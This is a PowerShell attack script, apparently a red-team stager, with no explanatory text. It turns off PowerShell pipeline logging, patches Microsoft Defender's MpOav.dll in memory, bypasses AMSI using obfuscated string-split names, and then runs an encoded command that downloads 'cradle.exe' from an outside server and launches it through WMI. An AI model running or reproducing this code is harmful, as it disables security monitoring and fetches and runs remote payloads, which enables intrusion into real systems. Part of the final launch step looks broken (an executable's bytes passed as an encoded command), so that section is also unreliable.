[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$User = $env:UserName
$Domain = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)

$estring=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$server="https://ca.reyes-holdings.uk";$url="$server/file/download";$wc=New-Object System.Net.WebClient; $data=$wc.DownloadData($url); rm -force "C:\temp\cradle.exe" -ea ignore;[io.file]::WriteAllBytes("C:\temp\cradle.exe",$data) | Out-Null;'))
powershell -encodedCommand $estring

# Define the path to the executable
$exePath = "C:\temp\cradle.exe"

# Define the arguments to pass to the executable
$arg1 = "-server $server"
$arg2 = "-group red"

# Convert the executable and arguments to base64-encoded strings
$exeBytes = [System.IO.File]::ReadAllBytes($exePath)
$exeBase64 = [System.Convert]::ToBase64String($exeBytes)
$arg1Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($arg1))
$arg2Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($arg2))

# Create a new WMI object for the Win32_Process class
$process = [WMIClass]"\\.\root\cimv2:Win32_Process"

# Call the Create method of the Win32_Process class to start the executable in memory with the specified arguments
$process.Create("powershell.exe -EncodedCommand $exeBase64 $arg1Base64 $arg2Base64")